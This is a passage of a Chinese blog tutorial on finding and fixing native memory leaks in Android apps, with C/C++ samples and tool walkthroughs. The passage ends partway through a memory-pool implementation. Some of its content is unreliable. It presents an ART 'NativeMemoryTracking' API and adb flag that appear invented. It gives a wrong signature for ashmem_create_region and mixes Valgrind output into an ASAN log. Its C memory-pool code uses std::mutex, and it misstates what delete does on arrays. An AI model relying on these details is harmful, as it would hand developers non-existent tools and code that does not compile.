<p><strong>Java堆</strong>：由虚拟机（ART/Dalvik）管理，有GC自动回收“垃圾”，开发者不用手动操心内存释放，顶多注意下内存泄漏（比如静态引用持有Activity）。但Java堆有大小限制，超出就会报Java层OOM。</p>
</li>
<li>
<p><strong>Native堆</strong>：直接向系统申请内存，不受虚拟机管理，没有自动回收机制——<strong>分配多少、释放多少，全靠开发者手动控制</strong>。它的“天花板”是设备的物理内存，看似空间更大，但一旦失控，不仅会导致APP闪退，还可能拖慢整个系统。</p>
</li>
</ul>
<p>举个通俗的例子：Java堆像小区里的“智能储物柜”，用完有人自动清理；Native堆像自己租的“私人仓库”，用完不手动收拾，东西会一直堆着，直到仓库堆满再也塞不下。</p>
<h3 data-id="heading-3">1.2 Native内存的分配与释放：核心API拆解</h3>
<p>Native内存分配主要依赖C/C++的标准库和Android的专用API，不同方式的“脾气”不同，用错了就容易出问题。我们先梳理常用的分配/释放API，避免从源头踩坑：</p>
<h4 data-id="heading-4">（1）C标准库API（最常用，也最容易漏释放）</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-comment">// 分配内存：未初始化，内容是随机值</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>; 
<span class="hljs-comment">// 分配内存：初始化所有字节为0</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">calloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> num, <span class="hljs-type">size_t</span> size)</span>; 
<span class="hljs-comment">// 重新分配内存：扩大/缩小已有内存块，可能会移动内存地址</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">realloc</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr, <span class="hljs-type">size_t</span> size)</span>; 
<span class="hljs-comment">// 释放内存：必须和分配API成对使用，否则内存泄漏</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">free</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span>; 

</code></pre>
<p>关键提醒：malloc/calloc/realloc分配的内存，必须用free释放，且只能释放一次。重复释放（同一指针free两次）会导致崩溃，释放后再使用指针（野指针）会引发未知错误，堪比“踩地雷”。</p>
<h4 data-id="heading-5">（2）C++标准库API（封装更友好，但仍需手动管理）</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;new&gt;</span></span>

<span class="hljs-comment">// 分配内存并调用构造函数</span>
<span class="hljs-type">int</span>* p1 = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>; 
<span class="hljs-type">int</span>* p2 = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">10</span>]; <span class="hljs-comment">// 分配数组</span>
<span class="hljs-comment">// 释放内存并调用析构函数</span>
<span class="hljs-keyword">delete</span> p1; 
<span class="hljs-keyword">delete</span>[] p2; <span class="hljs-comment">// 数组必须用delete[]，否则只释放首元素，内存泄漏</span>

</code></pre>
<p>这里有个经典坑：用new[]分配的数组，用delete（不带[]）释放，会导致数组中除首元素外的内存无法释放，形成“隐蔽性内存泄漏”——日志不报错，但内存会慢慢上涨，排查起来极其麻烦。</p>
<h4 data-id="heading-6">（3）Android专用API（针对性场景，需注意兼容性）</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cutils/memory.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;android/log.h&gt;</span></span>

<span class="hljs-comment">// 分配可缓存的内存，适合频繁分配/释放的小内存块</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">ashmem_create_region</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* name, <span class="hljs-type">size_t</span> size)</span>;
<span class="hljs-comment">// 分配共享内存，用于跨进程通信</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span>* addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;
<span class="hljs-comment">// 释放共享内存/映射内存</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span>* addr, <span class="hljs-type">size_t</span> length)</span>;

</code></pre>
<p>这类API适合特殊场景（比如跨进程共享数据），但使用门槛更高，比如mmap分配的内存，必须用munmap释放，且要确保addr和length与分配时一致，否则会导致内存泄漏或系统异常。</p>
<h3 data-id="heading-7">1.3 Native内存泄漏：比Java泄漏更“致命”</h3>
<p>Native内存泄漏的本质是：<strong>分配的内存没有被释放，且指向该内存的指针被销毁，导致系统无法回收这部分内存</strong>。和Java内存泄漏相比，它更难排查——Java泄漏可以通过Profiler查看引用链，而Native泄漏没有现成的“引用链”可查，且泄漏的内存会一直占用系统资源，直到APP进程被杀死。</p>
<p>举个典型的泄漏场景：在Native层写一个工具类，提供一个初始化方法，分配内存后存储在全局指针中，但没有提供对应的释放方法。每次调用初始化方法，都会分配新的内存，旧的内存指针被覆盖，再也无法释放，内存会像滚雪球一样越滚越大。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-comment">// 全局指针，持有分配的内存</span>
<span class="hljs-type">char</span>* global_buf = <span class="hljs-literal">NULL</span>;

<span class="hljs-comment">// 初始化方法：分配内存，但未提供释放方法</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">init_buf</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 每次调用都会分配新内存，旧的global_buf指向的内存被泄漏</span>
    global_buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>); <span class="hljs-comment">// 1MB</span>
}

<span class="hljs-comment">// 只调用初始化，不释放</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
        init_buf(); <span class="hljs-comment">// 循环100次，泄漏100MB内存</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<p>这种泄漏看似简单，但在复杂项目中（比如多线程、跨模块调用），很容易被忽略——比如初始化方法被多个地方调用，却没人关注内存是否释放，等到APP闪退时，才发现“锅”在Native层。</p>
<h2 data-id="heading-8">二、工具篇：精准定位Native内存问题（告别“瞎猜”）</h2>
<p>优化的前提是“找到问题”，Native内存问题看不见、摸不着，必须靠工具辅助。下面推荐4个常用工具，从简单到复杂，覆盖“内存监控-泄漏定位-碎片分析”全流程，新手也能快速上手。</p>
<h3 data-id="heading-9">2.1 Android Studio Profiler：快速排查基础问题</h3>
<h4 data-id="heading-10">适用场景：快速查看Native内存整体趋势，判断是否存在内存泄漏、内存暴涨。</h4>
<p>操作步骤：</p>
<ol>
<li>
<p>打开Android Studio，连接真机/模拟器，运行APP；</p>
</li>
<li>
<p>点击底部「Profiler」，选择「Memory」标签，在顶部选择要监控的APP进程；</p>
</li>
<li>
<p>在「Memory Usage」图表中，选择「Native」选项，即可查看Native内存的实时变化。</p>
</li>
</ol>
<p>关键解读：</p>
<ul>
<li>
<p>如果Native内存曲线<strong>持续上涨，且操作完成后（比如关闭页面、停止操作）不下降</strong>，大概率存在内存泄漏；</p>
</li>
<li>
<p>如果内存曲线<strong>频繁波动、暴涨暴跌</strong>，可能是频繁分配/释放小内存块，导致内存碎片严重；</p>
</li>
<li>
<p>缺点：只能看到整体趋势，无法定位到具体的泄漏代码行，适合“初步排查”。</p>
</li>
</ul>
<h3 data-id="heading-11">2.2 Native Memory Tracking（NMT）：Google官方神器</h3>
<h4 data-id="heading-12">适用场景：精准统计Native内存分配详情，定位泄漏的模块/API，支持ART虚拟机的Android 7.0+设备。</h4>
<p>NMT是ART虚拟机提供的Native内存跟踪工具，能统计不同类型的Native内存分配（比如malloc分配、mmap分配、线程栈内存等），还能生成详细的内存报告，帮你找到“内存刺客”。</p>
<h4 data-id="heading-13">实战操作：</h4>
<h5 data-id="heading-14">步骤1：开启NMT跟踪</h5>
<p>在APP启动时，通过adb命令开启NMT（需root权限，或APP拥有DEBUG权限）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 开启NMT，模式为full（完整跟踪，会有一定性能开销）</span>
adb shell am start -n 包名/主Activity名 --es android.nmt.app_level full

</code></pre>
<p>也可以在Native代码中手动开启：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;art/runtime/native_memory_tracking.h&gt;</span></span>

<span class="hljs-comment">// 开启full模式跟踪</span>
art::NativeMemoryTracking::StartTracking(art::NativeMemoryTracking::kFullTracking);

</code></pre>
<h5 data-id="heading-15">步骤2：生成内存报告</h5>
<p>执行相关操作（比如触发初始化、跳转页面）后，通过adb命令生成内存报告：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 生成NMT报告，保存到本地文件</span>
adb shell dumpsys meminfo 包名 --native-heap &gt; nmt_report.txt

</code></pre>
<h5 data-id="heading-16">步骤3：分析报告</h5>
<p>打开nmt_report.txt，重点关注「Native Heap Allocations」部分，会按分配类型统计内存使用情况，示例如下：</p>
<pre><code class="hljs language-text" lang="text">Native Heap Allocations:
Total: 120MB
  malloc: 80MB (66.7%)
    libnative-lib.so: 75MB  # 重点！该so库分配了大量内存
      0x7f1234567890: 1MB (malloc, 函数名: init_buf)
      0x7f12345678a0: 1MB (malloc, 函数名: init_buf)
      ...
  mmap: 30MB (25.0%)
  thread stack: 10MB (8.3%)

</code></pre>
<p>从报告中可以看出，「libnative-lib.so」库的「init_buf」函数分配了大量内存，结合代码排查，就能快速定位到泄漏点——比如该函数频繁分配内存却未释放。</p>
<p>小技巧：如果APP使用了多个Native库，可以通过报告中的「libxxx.so」分组，快速锁定内存占用最高的模块，缩小排查范围。</p>
<h3 data-id="heading-17">2.3 Valgrind：Linux老牌工具，精准定位泄漏与野指针</h3>
<h4 data-id="heading-18">适用场景：本地调试Native代码，精准定位内存泄漏、野指针、重复释放等问题，适合C/C++原生开发。</h4>
<p>Valgrind是Linux下的内存调试工具，Android的Native代码本质是Linux程序，因此可以用它进行本地调试。它的核心工具是Memcheck，能监控每一次内存分配/释放，捕捉所有内存异常。</p>
<h4 data-id="heading-19">实战操作（Linux/macOS环境）：</h4>
<h5 data-id="heading-20">步骤1：编译Native代码（带调试信息）</h5>
<p>在CMakeLists.txt中添加调试选项，确保生成的so库包含调试信息（方便定位到代码行）：</p>
<pre><code class="hljs language-cmake" lang="cmake">cmake_minimum_required(VERSION 3.10.2)
project("native-lib")

# 添加调试信息，禁用优化（避免编译器优化导致代码行映射错误）
set(CMAKE_BUILD_TYPE Debug)
set(CMAKE_CXX_FLAGS_DEBUG "-g -O0")

add_library(
        native-lib
        SHARED
        native-lib.cpp
)

# 链接相关库
find_library(
        log-lib
        log
)

target_link_libraries(
        native-lib
        ${log-lib}
)

</code></pre>
<h5 data-id="heading-21">步骤2：用Valgrind运行调试</h5>
<p>将编译好的so库和测试程序放到Linux环境中，执行以下命令：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 用Memcheck工具调试，生成泄漏报告</span>
valgrind --tool=memcheck --leak-check=full --show-leak-kinds=all ./test-native-app
</code></pre>
<h5 data-id="heading-22">步骤3：分析结果</h5>
<p>Valgrind会输出详细的内存异常报告，示例如下：</p>
<pre><code class="hljs language-text" lang="text">==12345== 100MB in 100 blocks are definitely lost in loss record 123
==12345==    at 0x4C2FB0F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==12345==    by 0x1087E9: init_buf (native-lib.cpp:15)
==12345==    by 0x10885A: main (native-lib.cpp:25)

</code></pre>
<p>报告明确指出：在native-lib.cpp的第15行（init_buf函数），通过malloc分配的内存被“明确泄漏”，共100MB，对应我们之前写的泄漏代码。这样就能精准定位到泄漏的代码行，直接修改即可。</p>
<p>缺点：运行速度较慢（会增加程序运行耗时），不适合真机调试，只能用于本地开发阶段排查问题。</p>
<h3 data-id="heading-23">2.4 AddressSanitizer（ASAN）：快速捕捉内存异常（Android 8.0+）</h3>
<h4 data-id="heading-24">适用场景：真机调试，快速捕捉内存泄漏、野指针、缓冲区溢出等问题，性能开销比Valgrind小，适合开发后期验证优化效果。</h4>
<p>ASAN是Google推出的内存错误检测工具，Android 8.0+支持将其集成到APP中，能在运行时实时检测内存异常，并输出详细的错误日志，包括错误类型、代码行号。</p>
<h4 data-id="heading-25">实战操作：</h4>
<h5 data-id="heading-26">步骤1：在CMakeLists.txt中配置ASAN</h5>
<pre><code class="hljs language-cmake" lang="cmake">cmake_minimum_required(VERSION 3.10.2)
project("native-lib")

# 配置ASAN（仅Debug模式启用）
if(CMAKE_BUILD_TYPE STREQUAL "Debug")
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -fsanitize=address -fno-omit-frame-pointer")
    set(CMAKE_SHARED_LINKER_FLAGS "${CMAKE_SHARED_LINKER_FLAGS} -fsanitize=address")
endif()

add_library(
        native-lib
        SHARED
        native-lib.cpp
)

find_library(
        log-lib
        log
)

target_link_libraries(
        native-lib
        ${log-lib}
)

</code></pre>
<h5 data-id="heading-27">步骤2：运行APP并查看日志</h5>
<p>编译Debug版本的APP，安装到Android 8.0+真机上，运行触发内存异常的操作，通过Logcat查看日志，ASAN会输出类似如下的错误信息：</p>
<pre><code class="hljs language-text" lang="text">=================================================================
==12345==ERROR: AddressSanitizer: heap-use-after-free on address 0x7f1234567890 at pc 0x7f12345678a0
WRITE of size 4 at 0x7f1234567890 thread T0
    #0 0x7f123456789f in test_free (native-lib.cpp:20)
    #1 0x7f123456790a in main (native-lib.cpp:30)
    ...
==12345==HEAP SUMMARY:
==12345==     in use at exit: 100MB in 100 blocks
==12345==   total heap usage: 101 allocs, 1 frees, 100MB allocated
==12345==
==12345== LEAK SUMMARY:
==12345==    definitely lost: 100MB in 100 blocks
==12345==    indirectly lost: 0 bytes in 0 blocks
==12345==      possibly lost: 0 bytes in 0 blocks
==12345==    still reachable: 0 bytes in 0 blocks
==12345==         suppressed: 0 bytes in 0 blocks

</code></pre>
<p>从日志中可以清晰看到：在native-lib.cpp的第20行，出现了“释放后使用”（heap-use-after-free）的错误，同时存在100MB的内存泄漏。相比Valgrind，ASAN的运行速度更快，且支持真机调试，是开发后期排查Native内存问题的首选工具。</p>
<h2 data-id="heading-28">三、实战优化篇：从代码层面搞定Native内存问题</h2>
<p>找到问题后，就该动手优化了。Native内存优化的核心原则是：<strong>减少不必要的分配、确保内存及时释放、避免内存碎片</strong>。下面从“泄漏修复、内存复用、碎片优化、特殊场景优化”四个维度，结合实战代码讲解具体技巧。</p>
<h3 data-id="heading-29">3.1 内存泄漏修复：从“源头”杜绝泄漏</h3>
<p>内存泄漏是Native内存最常见的问题，修复的关键是“确保分配的内存都能被释放”，针对不同的泄漏场景，有对应的修复方案。</p>
<h4 data-id="heading-30">场景1：全局指针未释放（最常见）</h4>
<p>问题代码：如前文所述，全局指针持有内存，未提供释放方法，导致多次调用初始化函数后泄漏。</p>
<p>修复方案：提供对应的释放函数，在APP退出、模块销毁时调用，同时避免重复分配。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span>

<span class="hljs-type">char</span>* global_buf = <span class="hljs-literal">NULL</span>;
<span class="hljs-type">bool</span> is_init = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 标记是否已初始化，避免重复分配</span>

<span class="hljs-comment">// 初始化方法：增加判断，避免重复分配</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">init_buf</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (is_init) {
        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 已初始化，直接返回</span>
    }
    global_buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>); <span class="hljs-comment">// 1MB</span>
    <span class="hljs-keyword">if</span> (global_buf != <span class="hljs-literal">NULL</span>) {
        is_init = <span class="hljs-literal">true</span>;
    }
}

<span class="hljs-comment">// 释放方法：在APP退出时调用</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">release_buf</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (global_buf != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">free</span>(global_buf);
        global_buf = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 置空指针，避免野指针</span>
        is_init = <span class="hljs-literal">false</span>;
    }
}

<span class="hljs-comment">//  APP退出时调用释放函数</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    init_buf();
    <span class="hljs-comment">// 业务逻辑...</span>
    release_buf(); <span class="hljs-comment">// 手动释放，避免泄漏</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<h4 data-id="heading-31">场景2：C++对象未调用析构函数</h4>
<p>问题代码：用new创建C++对象后，未用delete释放，或对象是全局/静态的，程序退出前未销毁，导致析构函数未执行，内存泄漏。</p>
<p>修复方案：确保new和delete成对使用；对于全局/静态对象，可使用智能指针（C++11+）自动管理。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;new&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory&gt;</span> <span class="hljs-comment">// 智能指针头文件</span></span>

<span class="hljs-comment">// 自定义类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObject</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">MyObject</span>() {
        <span class="hljs-comment">// 构造函数中分配内存</span>
        m_buf = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>];
    }
    ~<span class="hljs-built_in">MyObject</span>() {
        <span class="hljs-comment">// 析构函数中释放内存</span>
        <span class="hljs-keyword">if</span> (m_buf != <span class="hljs-literal">NULL</span>) {
            <span class="hljs-keyword">delete</span>[] m_buf;
            m_buf = <span class="hljs-literal">NULL</span>;
        }
    }
<span class="hljs-keyword">private</span>:
    <span class="hljs-type">char</span>* m_buf;
};

<span class="hljs-comment">// 方案1：手动管理，new和delete成对使用</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_object</span><span class="hljs-params">()</span> </span>{
    MyObject* obj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">MyObject</span>();
    <span class="hljs-comment">// 业务逻辑...</span>
    <span class="hljs-keyword">delete</span> obj; <span class="hljs-comment">// 手动释放，触发析构函数</span>
}

<span class="hljs-comment">// 方案2：使用智能指针（推荐），自动管理内存</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_smart_ptr</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// unique_ptr：独占所有权，自动释放</span>
    <span class="hljs-function">std::unique_ptr&lt;MyObject&gt; <span class="hljs-title">obj</span><span class="hljs-params">(<span class="hljs-keyword">new</span> MyObject())</span></span>;
    <span class="hljs-comment">// 业务逻辑...</span>
    <span class="hljs-comment">// 无需手动delete，智能指针生命周期结束时自动释放</span>
}

</code></pre>
<p>重点推荐C++11后的智能指针（unique_ptr、shared_ptr），它们能自动管理内存，避免手动释放的遗漏，是C++ Native开发的“内存管家”。但要注意：shared_ptr存在循环引用的问题，会导致内存泄漏，需配合weak_ptr使用。</p>
<h4 data-id="heading-32">场景3：跨模块调用导致的泄漏</h4>
<p>问题场景：Module A分配内存，传递给Module B使用，Module A释放了内存，但Module B还在使用该指针（野指针）；或Module B持有指针，Module A未通知Module B就释放了内存。</p>
<p>修复方案：制定明确的内存管理规范，比如“谁分配、谁释放”，或“分配方提供释放接口，使用方调用后再释放”。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// Module A：分配内存，提供释放接口</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-type">void</span>* <span class="hljs-title function_">alloc_memory</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">malloc</span>(size);
}

<span class="hljs-type">void</span> <span class="hljs-title function_">free_memory</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span> {
    <span class="hljs-keyword">if</span> (ptr != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">free</span>(ptr);
    }
}

<span class="hljs-comment">// Module B：使用Module A分配的内存，调用Module A的释放接口</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"module_a.h"</span></span>

<span class="hljs-type">void</span> <span class="hljs-title function_">use_memory</span><span class="hljs-params">()</span> {
    <span class="hljs-type">void</span>* buf = alloc_memory(<span class="hljs-number">1024</span>);
    <span class="hljs-comment">// 业务逻辑...</span>
    free_memory(buf); <span class="hljs-comment">// 调用分配方的释放接口，避免泄漏</span>
}

</code></pre>
<h3 data-id="heading-33">3.2 内存复用：减少重复分配，提升效率</h3>
<p>频繁分配/释放小内存块，不仅会导致内存泄漏，还会产生大量内存碎片。内存复用的核心是“重复利用已分配的内存”，减少分配次数，常用方案有“对象池”“内存池”。</p>
<h4 data-id="heading-34">方案1：对象池（适合C++对象复用）</h4>
<p>场景：频繁创建/销毁同类型的C++对象（比如网络请求对象、数据解析对象），每次创建都要分配内存，销毁要释放内存，效率低下。</p>
<p>思路：提前创建一批对象，存放在对象池中，需要时从池中获取，用完后归还给池，避免频繁new/delete。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory&gt;</span></span>

<span class="hljs-comment">// 自定义对象</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkRequest</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">NetworkRequest</span>() { <span class="hljs-comment">/* 构造函数，初始化资源 */</span> }
    ~<span class="hljs-built_in">NetworkRequest</span>() { <span class="hljs-comment">/* 析构函数，释放资源 */</span> }

    <span class="hljs-comment">// 重置对象状态，方便复用</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reset</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-comment">// 清空请求数据、重置状态</span>
        m_data.<span class="hljs-built_in">clear</span>();
        m_status = <span class="hljs-number">0</span>;
    }

    <span class="hljs-comment">// 业务方法</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">send_request</span><span class="hljs-params">()</span> </span>{ <span class="hljs-comment">/* 发送网络请求 */</span> }

<span class="hljs-keyword">private</span>:
    std::string m_data;
    <span class="hljs-type">int</span> m_status;
};

<span class="hljs-comment">// 对象池类（线程安全）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestPool</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 单例模式，避免多实例创建</span>
    <span class="hljs-function"><span class="hljs-type">static</span> RequestPool&amp; <span class="hljs-title">get_instance</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-type">static</span> RequestPool instance;
        <span class="hljs-keyword">return</span> instance;
    }

    <span class="hljs-comment">// 从池中获取对象</span>
    <span class="hljs-function">std::shared_ptr&lt;NetworkRequest&gt; <span class="hljs-title">get_request</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(m_mutex)</span></span>; <span class="hljs-comment">// 线程安全锁</span>
        <span class="hljs-keyword">if</span> (m_pool.<span class="hljs-built_in">empty</span>()) {
            <span class="hljs-comment">// 池为空，创建新对象</span>
            <span class="hljs-keyword">return</span> std::<span class="hljs-built_in">make_shared</span>&lt;NetworkRequest&gt;();
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 池中有对象，取出并重置状态</span>
            <span class="hljs-keyword">auto</span> request = m_pool.<span class="hljs-built_in">back</span>();
            m_pool.<span class="hljs-built_in">pop_back</span>();
            request-&gt;<span class="hljs-built_in">reset</span>();
            <span class="hljs-keyword">return</span> request;
        }
    }

    <span class="hljs-comment">// 归还对象到池中</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">release_request</span><span class="hljs-params">(std::shared_ptr&lt;NetworkRequest&gt; request)</span> </span>{
        <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(m_mutex)</span></span>;
        m_pool.<span class="hljs-built_in">push_back</span>(request);
    }

<span class="hljs-keyword">private</span>:
    <span class="hljs-built_in">RequestPool</span>() {} <span class="hljs-comment">// 私有构造，禁止外部创建</span>
    <span class="hljs-built_in">RequestPool</span>(<span class="hljs-type">const</span> RequestPool&amp;) = <span class="hljs-keyword">delete</span>; <span class="hljs-comment">// 禁止拷贝</span>
    RequestPool&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> RequestPool&amp;) = <span class="hljs-keyword">delete</span>; <span class="hljs-comment">// 禁止赋值</span>

    std::vector&lt;std::shared_ptr&lt;NetworkRequest&gt;&gt; m_pool; <span class="hljs-comment">// 对象池容器</span>
    std::mutex m_mutex; <span class="hljs-comment">// 线程安全锁</span>
};

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_request_pool</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">auto</span>&amp; pool = RequestPool::<span class="hljs-built_in">get_instance</span>();
    <span class="hljs-comment">// 从池中获取对象</span>
    <span class="hljs-keyword">auto</span> request = pool.<span class="hljs-built_in">get_request</span>();
    <span class="hljs-comment">// 使用对象</span>
    request-&gt;<span class="hljs-built_in">send_request</span>();
    <span class="hljs-comment">// 归还对象到池中，复用</span>
    pool.<span class="hljs-built_in">release_request</span>(request);
}

</code></pre>
<p>优点：减少对象创建/销毁的次数，避免频繁分配内存；线程安全设计，适合多线程场景；对象复用前重置状态，避免数据污染。</p>
<h4 data-id="heading-35">方案2：内存池（适合C/C++通用内存复用）</h4>
<p>场景：频繁分配/释放固定大小的内存块（比如1KB、4KB），比如图片处理、数据缓存等场景。</p>
<p>思路：提前分配一块大内存，分割成多个固定大小的小内存块，需要时从内存池中获取小内存块，用完后归还给池，避免频繁调用malloc/free。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>

<span class="hljs-comment">// 内存块结构</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryBlock</span> {</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryBlock</span>* <span class="hljs-title">next</span>;</span> <span class="hljs-comment">// 下一个内存块的指针，用于链表管理</span>
    <span class="hljs-type">bool</span> is_used; <span class="hljs-comment">// 标记是否被使用</span>
    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 内存块的数据区域（柔性数组，不占用结构体大小）</span>
} MemoryBlock;

<span class="hljs-comment">// 内存池结构</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryPool</span> {</span>
    MemoryBlock* head; <span class="hljs-comment">// 内存块链表头</span>
    <span class="hljs-type">size_t</span> block_size; <span class="hljs-comment">// 每个内存块的大小</span>
    <span class="hljs-type">size_t</span> block_count; <span class="hljs-comment">// 内存块的数量</span>
    <span class="hljs-built_in">std</span>::mutex mutex; <span class="hljs-comment">// 线程安全锁</span>
} MemoryPool;

<span class="hljs-comment">// 初始化内存池：分配一块大内存，分割成多个固定大小的内存块</span>
<span class="hljs-type">bool</span> <span class="hljs-title function_">init_memory_pool</span><span class="hljs-params">(MemoryPool* pool, <span class="hljs-type">size_t</span> block_size, <span class="hljs-type">size_t</span> block_count)</span> {
    <span class="hljs-keyword">if</span> (pool == <span class="hljs-literal">NULL</span> || block_size == <span class="hljs-number">0</span> || block_count == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    pool-&gt;block_size = block_size;
    pool-&gt;block_count = block_count;

    <span class="hljs-comment">// 计算总内存大小：内存块链表头 + 每个内存块的大小（结构体大小 + 数据区域大小）</span>
    <span class="hljs-type">size_t</span> total_size = <span class="hljs-keyword">sizeof</span>(MemoryBlock) * block_count + block_size * block_count;
